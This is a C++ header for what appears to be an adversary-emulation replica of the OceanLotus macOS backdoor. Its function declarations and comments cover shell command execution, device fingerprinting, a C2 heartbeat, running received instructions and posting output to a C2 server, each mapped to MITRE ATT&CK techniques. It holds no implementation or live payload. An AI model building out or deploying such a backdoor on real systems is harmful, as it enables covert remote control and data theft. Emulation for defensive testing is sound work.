#ifndef ClientPP_hpp
#define ClientPP_hpp

#include <chrono>
#include <ctime>
#include <iostream>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string>
#include <thread>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>

#include "dlfcn.h"
#include "Communication.hpp"
#include "Transform.hpp"

namespace client {
    extern const int RESP_BUFFER_SIZE;

    /*
    executeCmd
        About:
            Helper function to execute a command on the system using the popen
            API
        Result:
            std::string - output of the command
        MITRE ATT&CK Techniques:
            T1059.004 Command and Scripting Interpreter: Unix Shell
    */
    std::string executeCmd(std::string cmd);

    /*
    getPlatformExpertDeviceValue
        About:
            Helper function to enumerate values from the IOPlatformExpertDevice
            registry class containing information about device configuration by
            leveraging the following API calls from IOKit:
                - IOServiceGetMatchingService
                - IOServiceMatching
                - IORegistryEntryCreateCFProperty
                - IOObjectRelease
        Result:
            std::string - value of the provided registry key
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
    */
    std::string getPlatformExpertDeviceValue(std::string key);
}

class ClientPP
{
public:
    /*
    Variables modeled after HandlePP class - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
    May end up removing some if unneeded
    */
    std::string pathProcess;
    uint8_t     clientID[24];
    std::string strClientID;
    int64_t     installTime;
    // void        *urlRequest;
    // int8_t      keyDecrypt[24];
    // int64_t     timeCheckRequestTimeout;
    // int         posDomain;
    std::string domain;
    // int         count;

    void *      dylib;

    /*
    osInfo
        About:
            Modeled after HandlePP::infoClient function. Responsible for collecting
            OS information, creating the clientID, and submitting to the C2 server:
                - perform OS discovery
                - create clientID
                - send collected information to C2 server via HTTP POST request
        Result:
            boolean - true if already executed or executed successfully, false
                    otherwise
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
            T1016 System Network Configuration Discovery
            T1124 System Time Discovery
            T1071.001 Application Layer Protocol: Web Protocols
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
            https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
        References:
            https://pubs.opengroup.org/onlinepubs/009604499/functions/getpwuid.html
    */
    static bool osInfo(int dwRandomTimeSleep, ClientPP * c);

    /*
    runClient
        About:
            Modeled after HandlePP::runHandle function. Responsible for performing
            backdoor capabilities:
                - sends heartbeat to C2 server via HTTP GET request
                - performs data transformations
                - executes received instructions
                - sends output to C2 server via HTTP POST request
        Result:
            void - no return value, just performs backdoor capabilities
        MITRE ATT&CK Techniques:
            T1071.001 Application Layer Protocol: Web Protocols
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
        References:
    */
    static void runClient(int dwRandomTimeSleep, void * dylib);

    /*
    createClientID
        About:
            Modeled after HandlePP::getClientID method. Responsible for generating
            an MD5 hash from the following pieces of information:
                - OS serial number
                - Hardware UUID
                - MAC address
                - Randomly generated UUID
        Result:
            clientID updated for the provided ClientPP
        MITRE ATT&CK Techniques:
            T1082 System Information Discovery
            T1016 System Network Configuration Discovery
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
        References:
            https://stackoverflow.com/a/54696457
    */
    static void createClientID(ClientPP * c);

    /*
    performHTTPRequest
        About:
            Modeled after HandlePP::requestServer method. Responsible for
            calling the loaded CommsLib exported function to generate an HTTP
            request (GET/POST).
        Result:
            vector of unsigned char - holds the HTTP request responses
        MITRE ATT&CK Techniques:
            T1071.001 Application Layer Protocol: Web Protocols
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
        References:
    */
    static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data);

    ~ClientPP();

};


#endif /* ClientPP_hpp */
